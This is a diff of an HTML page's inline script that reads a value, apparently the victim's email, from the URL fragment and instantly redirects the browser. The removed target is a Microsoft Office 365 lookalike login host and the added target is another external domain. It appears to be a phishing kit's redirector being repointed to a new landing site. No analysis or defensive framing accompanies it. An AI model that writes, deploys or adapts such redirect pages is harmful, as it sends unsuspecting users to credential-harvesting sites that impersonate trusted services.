@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://office-0365-secure-logincenter-verified001.tokensession.workers.dev?t=10";
+			window.location.href = "https://madrianlimited.com/apeyye/";
 		}, 0);
 	</script>
 </html>
